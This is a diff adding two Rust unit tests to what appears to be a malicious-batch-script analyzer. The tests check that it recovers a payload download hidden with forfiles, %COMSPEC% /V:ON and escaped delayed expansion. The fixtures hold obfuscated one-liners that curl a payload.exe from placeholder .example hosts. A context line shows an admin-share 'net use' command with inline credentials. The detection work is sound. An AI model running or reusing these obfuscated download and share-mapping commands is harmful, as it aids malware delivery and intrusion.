@@ -10742,6 +10742,43 @@ C:\Users\Public\nt.tmp use Z: \\target.example\C$ /user:DOMAIN\adm pass
             report.traits
         );
     }
+
+    #[test]
+    fn forfiles_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+forfiles /m payload.txt /c "%COMSPEC% /V:ON /c set U=https://forfiles-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://forfiles-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "forfiles escaped COMSPEC child did not preserve delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn forfiles_comspec_v_on_child_preserves_escaped_delayed_expansion() {
+        let script = br#"forfiles /m payload.txt /c "%COMSPEC% /V:ON /c set U=https://forfiles-von-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://forfiles-von-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "forfiles COMSPEC /V:ON child did not preserve escaped delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
